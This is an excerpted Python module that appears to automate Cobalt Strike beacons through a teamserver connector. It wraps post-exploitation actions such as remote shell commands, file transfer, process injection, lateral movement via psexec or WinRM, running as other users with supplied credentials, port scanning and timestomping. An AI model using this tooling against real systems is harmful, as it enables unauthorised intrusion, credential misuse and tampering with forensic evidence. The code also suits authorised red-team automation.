from rfc3986.normalizers import normalize_username

from payload_automation.striker import CSConnector
import beaconLogParser as bp
import re
...
class Beacon:
    ...
    def getMetadata(self):
        ...
        with CSConnector(cs_host=self.teamserver,
                         cs_user=username,
    ...
    def get_beacon_log(self):
        ...
        with CSConnector(cs_host=self.teamserver,
                         ...
                         cs_pass=self.password,
                         cs_directory=self.csdir) as cs:
            log = cs.get_beaconlog()

        return log


    def info(self):
        username = f"{self.user}_{self.id}_info"
    ...
    def bmkdir(self, path, output=True, expect_end=None, success_criteria=None, failure_criteria=None, pexpect_timeout=600):
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                if expect_end:
                    ...
                    #result.output = cs.cs_process.after
                result.completed = datetime.now()
                ...
                cs.ag_sendline(checkin_catcher)
                cs.cs_process.expect(r'host called home, sent:.*', timeout=600)
                result.completed = datetime.now()
                result.success = None
                self.tasks.append(result)
                return result
    ...
    def bshell(self, cmd, output=True, asynchronous=False, success_criteria = None, failure_criteria = ['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                #print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                cs.cs_process.expect(r'received output:.*', timeout=600)
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()
    ...
    def bupload(self, file, remote_path=None, bytes=None):
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            cs.cs_process.expect(r"host called home, sent: ([0-9]*) bytes", timeout=600)
    ...
    def bexit(self, output=False, success_criteria=None, failure_criteria=None, pexpect_timeout=90):
    ...
    def bls(self, path, output=True, asynchronous=False, success_criteria = None, failure_criteria = None, timeout=None):
        ...
        #agcode = f"sub catcher{{println('{self.id}_bls $3');}}; bls({self.id}, '{escaped_path}', &catcher);"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                print(f"Before catcher: {cs.cs_process.after}")
                cs.cs_process.expect(f'{escaped_path}.*', timeout=600)
                #cs.cs_process.expect(f'{self.id}_bls', timeout=None)
                print(f"After catcher: {cs.cs_process.after}")
                result.completed = datetime.now()
                result.output = cs.cs_process.after.decode()
                #print(result.output)
    ...
    def bps(self, output=True, asynchronous=False, success_criteria = None, failure_criteria = None, timeout=None):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bps"

        # bls and bps are a bit different because they actually accept callback functions, so what we want to do is build a sleep callback function and send that to catch the output
        #agcode = f"sub catcher{{println($2);}}; bps({self.id}, &catcher);"
        agcode = f"bps({self.id})"
        #agcode = f"bps({self.id}, &catcher);"
        result = Task(agcode)
        with CSConnector(cs_host=self.teamserver,
                         cs_user=username,
                         cs_pass=self.password,
            ...
            if output:
                sleep(60)
                ts_after_sleep = int(time.time())
                print(f"Time stamp after sleep: {ts_after_sleep}")
                log = cs.get_beaconlog()
                cmd = "list processes"

                ps_result = bp.get_response_with_output(log, self.id, cmd,ts_after)
                #print(f"Success: {result.success}")
                #print(f"Output: {result.result}")

                result.completed = datetime.now()
                result.success = ps_result.success
                result.output = ps_result.result
                #result.output = cs.cs_process.after.decode()
                #result.success = self.checkSuccess(result.output, success_criteria, failure_criteria)
    ...
    def binject(self, pid, listener, arch, output=True, asynchronous=False, success_criteria = None, failure_criteria = None):

        username = f"{self.user}_{self.id}_binject"

        agcode = f"binject({self.id}, {pid}, '{listener}', '{arch}')"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                if raw_initial_beacons:  # Check if it's not None or empty
                    # Ensure correct computer
                    computer = ""
                    for beacon_info in raw_initial_beacons:
                        if beacon_info['id'] == str(self.id):
                            computer = beacon_info['computer']
                            break
                    for b_info in raw_initial_beacons:
                        if b_info['computer'] == computer and b_info['pid'] == str(pid):
                            result.success = True
                            result.output = b_info
                            break
    ...
    def bjump(self, exploit, target_ip, listener, output=True, asynchronous=False, success_criteria = None, failure_criteria = None):
        """
        Execute pjump
        Args:
            exploit: method use to jump.  Option: psexec, psexec64, winrm, winrm64
            target_ip: ip of target machine
            listener: Name of the listener

        Returns:
        """
        username = f"{self.user}_{self.id}_bjump"

        agcode = f"bjump({self.id}, '{exploit}', '{target_ip}', '{listener}')"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                if raw_initial_beacons:  # Check if it's not None or empty
                    ...
                    for beacon_info in raw_initial_beacons:
                        if beacon_info['internal'] == str(target_ip) or beacon_info['host'] == str(target_ip):
                            result.success = True
                            result.output = beacon_info
                            break
    ...
    def bspawnas(self, domain, user, password, listener, output=True, asynchronous=False, success_criteria = None, failure_criteria = None):
        """
        ...
        Args:
            ...
            listener: the listener to spawn

        Returns:
        """
        username = f"{self.user}_{self.id}_bspawnas"

        agcode = f"bspawnas({self.id}, '{domain}', '{user}', '{password}', '{listener}')"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                if raw_initial_beacons:  # Check if it's not None or empty
                    ...
                    for b_info in raw_initial_beacons:
                        #remove * from user
                        normalize_user = b_info['user'].replace("*", "")
                        if b_info['computer'] == computer and b_info['user'] == normalize_user and b_info['alive'] == 'true':
                            result.success = True
                            result.output = b_info
                            break
    ...
    def bportscan(self, target_ip, port, method, max_socket):
        """
        ...
        username = f"{self.user}_{self.id}_bportscan"

        agcode = f"bportscan({self.id}, '{target_ip}', '{port}', '{method}', '{max_socket}')"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            ps_result = bp.get_response_with_output(log, self.id, cmd, ts)
            result.completed = datetime.now()
            result.success = ps_result.success
            result.output = ps_result.result
            self.tasks.append(result)
    ...
    def bgetuid(self, output=True, asynchronous=False, expect_end=None, success_criteria=None, failure_criteria=['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):

        agcode = f"bgetuid({self.id})"
        result = Task(agcode)

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bgetuid"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            # print(f"binput({self.id}, '{cmd}')")
            if output:
                output_catcher = f"on beacon_output_alt{{if($1 eq '{self.id}'){{ println($2);}}}}"
                # print(output_catcher)
                # print(cs.ag_get_string(output_catcher))
                # print(cs.ag_get_string(output_catcher, expect=r'.*received output:'))
                cs.ag_sendline(output_catcher)
                if expect_end:
                    ...
                    output_rex = re.compile('received output:\r\n(.*)', re.DOTALL | re.MULTILINE)
                    result.output = \
                    re.findall(output_rex, (cs.cs_process.before.decode() + cs.cs_process.after.decode()))[0]
                else:
                    # print("In the after sitch")
                    #cs.cs_process.expect(r'received output:.*', timeout=60)
                    cs.cs_process.expect(r'You are.*', timeout=600)
                    result.output = cs.cs_process.after.decode()
                result.completed = datetime.now()
    ...
    def bpwd(self, output=True, asynchronous=False, expect_end=None, success_criteria=None, failure_criteria=['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):

        agcode = f"bpwd({self.id})"
        result = Task(agcode)

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bpwd"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            if output:
                ...
                if expect_end:
                    ...
                    cs.cs_process.expect(r'Current.*', timeout=600)
                    result.output = cs.cs_process.after.decode()
                result.completed = datetime.now()
    ...
    def brm(self, path, output=False, asynchronous=False, success_criteria = None, failure_criteria = None):
        ...
        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_brm"
        escaped_path = path.replace("\\", "\\\\")
    ...
    def bdownload(self, target_path, local_path, output=False, asynchronous=False, success_criteria = None, failure_criteria = None):
        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_bdownload"

        target_path_ = target_path.replace("\\", "\\\\")

        agcode = f"bdownload({self.id}, '{target_path_}');"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            cs.ag_sendline(checkin_catcher)
            cs.cs_process.expect(r'download of .* is complete.*', timeout=600)

            if local_path:
                download_file_list = cs.get_downloads()
                for item in download_file_list:
                    file_name = ntpath.basename(target_path)
                    if item['path'] in target_path and item['name'] == file_name and item['bid'] == str(self.id):
                        result.output = item['lpath']
    ...
    def brunas(self, user, password, domain, cmd, output=False, asynchronous=False, success_criteria=None, failure_criteria = ['received output:.*\r\n.*is not recognized as an internal or external command,', 'received output:.*\r\n.*was unexpected at this time.']):

        agcode = f"brunas({self.id}, '{domain}', '{user}', '{password}', '{cmd}')"
        result = Task(agcode)

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_brunas"
        ...
        with CSConnector(cs_host=self.teamserver,
            ...
            cs.ag_sendline(agcode)
            #print(f"binput({self.id}, '{cmd}')")
            # This is a situation where we don't get output, but we do get a message when it's complete.
            checkin_catcher = f"on beacon_checkin{{if($1 eq '{self.id}'){{ println($2);}}}}"
            cs.ag_sendline(checkin_catcher)
            cs.cs_process.expect(r'host called home, sent:.*', timeout=600)
            result.completed = datetime.now()
    ...
    def btimestomp(self, target_path, local_path, output=False, asynchronous=False, success_criteria=None, failure_criteria=None):

        # With so many automated connections going on, we need to make sure the username connecting in is unique enough
        username = f"{self.user}_{self.id}_btimestomp"
        escaped_target_path = target_path.replace("\\", "\\\\")
        escapted_local_path = local_path.replace("\\", "\\\\")

        agcode = f"btimestomp({self.id}, '{escaped_target_path}', '{escapted_local_path}');"
...
def cs_getBeaconInfo(teamserver, user, password, cobaltstrike_directory, bid):
    ...
    with CSConnector(cs_host=teamserver,
                     cs_user=username,
                     cs_pass = password,
